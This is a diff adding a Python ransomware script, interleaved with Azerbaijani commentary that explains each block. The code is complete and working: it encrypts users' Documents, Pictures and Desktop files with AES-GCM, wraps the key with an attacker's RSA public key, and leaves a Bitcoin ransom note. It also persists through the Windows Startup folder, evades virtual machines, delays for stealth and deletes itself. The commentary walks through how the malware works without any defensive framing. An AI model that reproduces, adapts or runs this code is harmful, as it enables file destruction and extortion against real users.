@@ -1,0 +1,207 @@
+Kod:
+import os
+import time
+import sys
+import shutil
+import subprocess
+import platform
+import ctypes
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives import serialization, hashes
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives.serialization import load_pem_public_key
+
+➡️ Bu sətirlər kitabxanaları əlavə edir:
+
+os, time, sys, shutil, subprocess, platform, ctypes – sistem əməliyyatları, fayllarla işləmək, zaman gecikməsi, platforma məlumatı.
+
+cryptography – şifrələmə üçün.
+
+Kod:
+ATTACKER_PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvH6ROxg...
+-----END PUBLIC KEY-----"""
+
+➡️ Hücumçunun açıq açarı (public key) burada saxlanılır.
+➡️ Bu açar AES açarını şifrələmək üçün istifadə olunur
+
+Kod:
+public_key = load_pem_public_key(ATTACKER_PUBLIC_KEY_PEM)
+
+➡️ public_key dəyişəninə hücumçunun açıq açarı yüklənir.
+➡️ Bu, sonra AES açarını şifrələmək üçün istifadə olunacaq.
+
+Kod:
+def generate_aes_key():
+    return AESGCM.generate_key(bit_length=128)
+
+➡️ Bu funksiya 128 bitlik təsadüfi AES açarı yaradır və geri qaytarır.
+
+Kod:
+def encrypt_aes_key(aes_key):
+    encrypted_key = public_key.encrypt(
+        aes_key,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
+    return encrypted_key
+
+➡️ Bu funksiya AES açarını RSA ilə şifrələyir:
+✅ Hücumçunun açıq açarını istifadə edir.
+✅ OAEP padding ilə şifrələyir (təhlükəsizlik üçün).
+✅ Şifrələnmiş AES açarını qaytarır.
+
+Kod:
+def encrypt_file(file_path, aes_key):
+    aesgcm = AESGCM(aes_key)
+    nonce = os.urandom(12)
+    try:
+        with open(file_path, "rb") as f:
+            data = f.read()
+        encrypted = aesgcm.encrypt(nonce, data, None)
+        with open(file_path, "wb") as f:
+            f.write(nonce + encrypted)
+    except Exception:
+        pass
+
+➡️ Bu funksiya faylı şifrələyir:
+✅ AES-GCM obyektini yaradır (AES açarından istifadə edir).
+✅ Nonce yaradır (12 bayt təsadüfi dəyər – AES-GCM üçün vacibdir).
+✅ Faylı oxuyur (rb – binary read).
+✅ AES-GCM ilə şifrələyir.
+✅ Fayla nonce + şifrələnmiş məlumat yazır.
+✅ Əgər səhv olsa, sadəcə keçib gedir (proqram donmasın deyə).
+
+Kod:
+def get_targets():
+    user_folders = ["Documents", "Pictures", "Desktop"]
+    targets = []
+    for folder in user_folders:
+        path = os.path.expanduser(f"~/{folder}")
+        for root, _, files in os.walk(path):
+            for file in files:
+                if not file.endswith((".exe", ".dll")):
+                    targets.append(os.path.join(root, file))
+    return targets
+
+➡️ Bu funksiya hədəf faylları tapır:
+✅ Documents, Pictures, Desktop qovluqları üzrə gəzir.
+✅ .exe və .dll fayllar istisna edilir.
+✅ Tapılan faylların tam yollarını siyahıya əlavə edir və geri qaytarır.
+
+Kod:
+def write_ransom_note():
+    note = """
+Your files have been encrypted!
+To recover your files, send 1 BTC to the following wallet:
+1FfmbHfnpaZjKFvyi1okTjJJusN455paPH
+Contact us at: attacker@tormail.onion
+"""
+    desktop = os.path.expanduser("~/Desktop")
+    try:
+        with open(os.path.join(desktop, "README_DECRYPT.txt"), "w") as f:
+            f.write(note)
+    except:
+        pass
+
+➡️ Bu funksiya fidye qeydi yaradır:
+✅ Qeyd mətnini README_DECRYPT.txt faylına masaüstündə yazır.
+✅ Əgər səhv olsa, proqram donmur – except hissəsi boşdur.
+
+Kod:
+def add_persistence():
+    if platform.system() == "Windows":
+        try:
+            startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+            script_path = os.path.abspath(sys.argv[0])
+            target_path = os.path.join(startup_folder, "winransom.pyw")
+            if not os.path.exists(target_path):
+                shutil.copyfile(script_path, target_path)
+        except Exception:
+            pass
+    else:
+        # For Linux/macOS, add a cron job or launch agent (not implemented here)
+        pass
+
+➡️ Bu funksiya Windows-da özünü avtomatik işə düşəcək fayllar qovluğuna kopyalayır:
+✅ startup folder yolunu alır.
+✅ Cari skriptin tam yolunu tapır (sys.argv[0]).
+✅ Əgər hədəf fayl mövcud deyilsə, özünü oraya kopyalayır.
+✅ Linux/macOS hissəsi boşdur (sadəcə qeyd olunub).
+
+Kod:
+def is_running_in_vm():
+    try:
+        if platform.system() == "Windows":
+            import wmi
+            c = wmi.WMI()
+            for system in c.Win32_ComputerSystem():
+                if "Virtual" in system.Model or "VMware" in system.Manufacturer:
+                    return True
+        else:
+            with open("/sys/class/dmi/id/product_name", "r") as f:
+                if "Virtual" in f.read():
+                    return True
+    except:
+        pass
+    return False
+
+➡️ Bu funksiya VM (virtual maşın) yoxlaması edir:
+✅ Windows-da wmi ilə cihaz modelini yoxlayır.
+✅ Digər OS-lərdə /sys/class/dmi/id/product_name faylını oxuyur.
+✅ "Virtual" və ya "VMware" tapılsa – True qaytarır.
+
+Kod:
+def cleanup():
+    try:
+        script_path = os.path.abspath(sys.argv[0])
+        os.remove(script_path)
+    except:
+        pass
+
+➡️ Bu funksiya özünü silir:
+✅ Cari skriptin yolunu alır və faylı silir.
+✅ Əgər alınmasa, except boşdur.
+
+Kod:
+def main():
+    # Stealth delay
+    time.sleep(15)
+    
+    if is_running_in_vm():
+        sys.exit()
+
+    add_persistence()
+
+    aes_key = generate_aes_key()
+    encrypted_key = encrypt_aes_key(aes_key)
+    
+    # Normally, send encrypted_key to attacker here (not shown)
+
+    targets = get_targets()
+    for file_path in targets:
+        encrypt_file(file_path, aes_key)
+
+    write_ransom_note()
+    
+    cleanup()
+
+➡️ main() funksiyası – prosesin ürəyi:
+✅ 15 saniyə gecikmə edir (şübhəli görünməmək üçün).
+✅ VM yoxlanışında çıxır.
+✅ Sistemdə qalmaq üçün özünü kopyalayır.
+✅ AES açarını yaradır və RSA ilə şifrələyir.
+✅ Hədəf faylları tapır və şifrələyir.
+✅ Fidye qeydi qoyur.
+✅ Sonda özünü silir.
+
+Kod:
+if __name__ == "__main__":
+    main()
+➡️ Skript birbaşa işə salınarsa, main() funksiyası çağırılır.
+
+
+
